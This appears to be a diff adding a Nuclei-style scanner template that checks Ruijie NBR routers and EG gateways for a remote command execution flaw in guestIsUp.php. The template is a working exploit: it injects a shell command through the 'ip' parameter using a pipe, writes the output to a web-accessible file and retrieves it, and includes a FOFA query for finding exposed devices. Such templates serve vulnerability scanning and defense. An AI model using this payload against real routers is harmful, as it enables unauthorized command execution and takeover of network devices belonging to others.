@@ -1,0 +1,32 @@
+http:
+    - matchers:
+        - condition: and
+          dsl:
+            - status_code_1 == 200
+            - status_code_2 == 200 && contains(tolower(body_2), 'filesystem')
+          type: dsl
+      raw:
+        - |
+          POST /guest_auth/guestIsUp.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+
+          mac=1&ip=127.0.0.1|df > {{randstr}}.txt
+        - |
+          GET /guest_auth/{{randstr}}.txt HTTP/1.1
+          Host: {{Hostname}}
+id: ruijie-eg-and-nbr-guest-auth-guestisup-rce
+info:
+    author: xy
+    metadata:
+        fofa-query: fid="BcZWN696xewWLAncU/0IiA=="
+        max-request: 1
+        veified: true
+    name: 锐捷NBR路由器、锐捷EG易网管guestisup.php远程命令执行漏洞
+    reference:
+        - https://blog.csdn.net/CCPxxxXxxx/article/details/119363934
+    severity: critical
+    tags:
+        - ruijie
+        - iot
+        - router
